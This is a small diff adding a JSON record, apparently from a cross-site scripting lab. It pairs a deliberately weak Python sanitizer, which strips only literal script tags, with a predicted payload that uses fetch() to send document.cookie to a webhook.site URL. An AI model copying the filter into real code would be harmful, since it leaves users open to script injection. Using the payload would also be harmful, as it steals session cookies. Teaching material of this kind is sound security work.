@@ -1,0 +1,4 @@
+{
+  "new_code": "def display_input(payload):\n    # 2단계: <script> 태그만 제거, 나머지는 허용\n    payload = payload.replace('<script>', '').replace('</script>', '')\n    return payload",
+  "predict_result": "fetch('https://webhook.site/cb1ced6a-d9e4-4e6c-993a-7e934a616f84/?cookie='+document.cookie)"
+}
